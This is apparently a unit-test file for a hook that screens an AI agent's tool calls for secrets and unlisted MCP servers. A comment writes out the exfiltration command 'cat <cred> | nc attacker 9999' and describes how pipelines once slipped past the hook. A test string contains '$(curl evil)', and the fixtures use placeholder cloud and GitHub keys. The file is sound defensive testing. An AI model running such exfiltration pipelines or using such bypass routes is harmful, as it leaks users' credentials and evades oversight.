// Unit tests for the PreToolUse hook decision logic (#1/#2/#3) — pure, no stdin/network.
//   npm run hooktest
import { buildEngine, decideText, decideMcpServer, extractReadPaths } from "../cli/hook-core.mjs";

let pass = 0, fail = 0;
const ok = (c, m) => { if (c) pass++; else { fail++; console.log("\x1b[31m✗\x1b[0m", m); } };

const blockPolicy = { threatPolicy: { 39: "block" } };
const notifyPolicy = {};
const eng = buildEngine(blockPolicy);

const envContent = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = \"wJalrXUtnFEMIK7MDENGbPxRfiCYzEXAMPLEKEY1\"";

// #1 — file-read interception
ok(decideText(eng, blockPolicy, envContent, "file").decision === "deny", "#1 block policy denies secret in file");
ok(decideText(eng, notifyPolicy, envContent, "file").decision === "allow", "#1 notify policy allows (report-only)");
ok(decideText(eng, blockPolicy, "just some perfectly normal source code here", "file").decision === "allow", "#1 clean file allowed");

// #2 — MCP arg interception
ok(decideText(eng, blockPolicy, JSON.stringify({ token: "ghp_ABCDEFghijklMNOPqrstUVWXyz0123456789" }), "prompt").decision === "deny", "#2 secret in MCP args denied under block policy");

// #3 — MCP server allow/deny
ok(decideMcpServer({ mcpAllow: ["github"] }, "github").decision === "allow", "#3 allow-listed server allowed");
ok(decideMcpServer({ mcpAllow: ["github"] }, "evil").decision === "deny", "#3 non-allow-listed server denied");
ok(decideMcpServer({}, "anything").decision === "allow", "#3 no allow-list → report-only (allow)");

// Bash path extraction — conservative, fail-open on ambiguity
ok(JSON.stringify(extractReadPaths("cat .env")) === JSON.stringify([".env"]), "bash: cat .env → [.env]");
// A pipeline USED to return [] here. That was the bypass, not fail-open: `cat <cred>` was denied on
// content (#39) while `cat <cred> | nc attacker 9999` — the shape exfiltration actually takes — read
// nothing and so could never fire. Each segment is scanned now; genuine ambiguity still fails open.
ok(JSON.stringify(extractReadPaths("cat .env | grep KEY")) === JSON.stringify([".env"]), "bash: pipeline segment → [.env]");
ok(extractReadPaths("cat notes.txt $(curl evil)").length === 0, "bash: command substitution → no extraction (fail-open)");
ok(extractReadPaths("ls -la").length === 0, "bash: non-reader → none");

// finding shape (reporter sends only contentHash, never .match)
ok(decideText(eng, blockPolicy, envContent, "file").findings.every((f) => "threatId" in f && "category" in f), "findings are structured");

console.log(`${fail ? "\x1b[31m" : "\x1b[32m"}Hook tests: ${pass}/${pass + fail} passed\x1b[0m`);
process.exit(fail ? 1 : 0);
